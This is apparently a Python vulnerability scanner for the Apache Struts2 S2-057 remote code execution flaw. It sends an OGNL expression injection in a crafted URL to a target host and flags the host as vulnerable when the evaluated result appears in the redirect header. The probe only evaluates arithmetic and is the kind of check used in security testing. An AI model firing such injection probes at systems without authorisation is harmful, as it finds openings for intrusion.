#!/usr/bin/env python
# _*_ coding: utf-8 _*_


import urllib
import requests




def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port


payload='''/struts2-showcase/$%7B233*233%7D/actionChain1.action'''


def S2_057_Main(arg):
    scheme, url, port = UrlProcessing(arg)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    payload_url = scheme+"://"+url+':'+str(port)+payload
    host=url+':'+str(port)
    headers = {
        'Host':host,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Connection': 'close',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }
    s = requests.session()
    try:
        resp = s.get(payload_url,headers=headers, timeout=5,allow_redirects=False)
        con = resp.headers['Location']
        code = resp.status_code
        if code==302 and con.lower().find('54289')!=-1:
            vul = "{} 存在Struts2远程代码执行漏洞\r\n漏洞详情:\r\n影响版本:版本低于<=Struts2_3_34,Struts2_5_16\r\nPayload:{}\r\n".format(url, payload_url)
            return (vul)
    except Exception as e:
        pass